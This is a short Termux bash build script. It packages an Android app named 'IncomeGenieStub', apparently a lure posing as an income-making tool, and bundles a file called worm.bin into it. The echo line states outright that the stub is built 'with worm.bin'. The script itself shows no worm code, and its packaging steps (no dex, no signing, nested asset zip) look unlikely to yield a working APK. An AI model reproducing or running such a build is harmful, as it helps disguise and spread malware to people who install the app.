#!/data/data/com.termux/files/usr/bin/bash
APPDIR="$HOME/buildAPKs/sources/github/BrokenEthicsaLab2025/IncomeGenieStub"
cd "$APPDIR" || exit 1

echo "[•] Building Income Genie Stub with worm.bin..."

aapt package -f -M AndroidManifest.xml -S res -I $PREFIX/share/aapt/android.jar -F resources.ap_
zip -r assets.zip assets
zip IncomeGenieStub.apk resources.ap_ assets.zip

echo "[✓] Stub APK built: $APPDIR/IncomeGenieStub.apk"
